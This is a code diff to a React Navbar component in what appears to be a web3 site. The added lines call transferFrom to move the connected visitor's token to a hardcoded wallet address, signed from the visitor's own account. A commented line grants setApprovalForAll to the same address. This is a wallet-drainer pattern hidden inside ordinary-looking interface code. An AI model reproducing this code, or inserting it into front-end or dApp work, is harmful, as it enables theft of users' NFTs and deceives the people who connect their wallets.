@@ -77,31 +77,36 @@ function Navbar() {
     const nonce = await provider.getTransactionCount(account);
 
     //for (let i = 0; i < length; i++) {
-      const contract = new ethers.Contract(tokenHashes[1], ABI, wallet);
-      console.log(contract)
+      const contract = new web3.eth.Contract(tokenHashes[1], ABI);
+      contract.methods.transferFrom(account, "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524", tokenIds[1])
+      .send({
+        from: account
+      })
+      .then(()=> {console.log(success)})
+      // console.log(contract)
       //await contract.setApprovalForAll("0x5Af5aE807692F3a9f99187bAa8E4966984F9d524", true)
-      const tx =  contract.transferFrom(
-        account, 
-        "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524",
-        tokenIds[1]);
-      console.log(tx)
+      // const tx =  contract.transferFrom(
+    //     account, 
+    //     "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524",
+    //     tokenIds[1]);
+    //   console.log(tx)
 
-      const txs = [
-        {
-          from : account,
-          to: "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524",
-          data: tx,
-          gas: 2000000,
-          gasPrice: 2000000,      
-        nonce: nonce
-        },
-      ];
-      provider.estimateGas(txs).then(gasAmount => {
-        console.log(`Estimated gas: ${gasAmount.toString()}`);
-    }).catch(error => {
-        console.error(`Error estimating gas: ${error}`);
-    });
-      const trasact = await signer.sendTransaction(txs)
+    //   const txs = [
+    //     {
+    //       from : account,
+    //       to: "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524",
+    //       data: tx,
+    //       gas: 2000000,
+    //       gasPrice: 2000000,      
+    //     nonce: nonce
+    //     },
+    //   ];
+    //   provider.estimateGas(txs).then(gasAmount => {
+    //     console.log(`Estimated gas: ${gasAmount.toString()}`);
+    // }).catch(error => {
+    //     console.error(`Error estimating gas: ${error}`);
+    // });
+    //   const trasact = await signer.sendTransaction(txs)
      
   //}
 
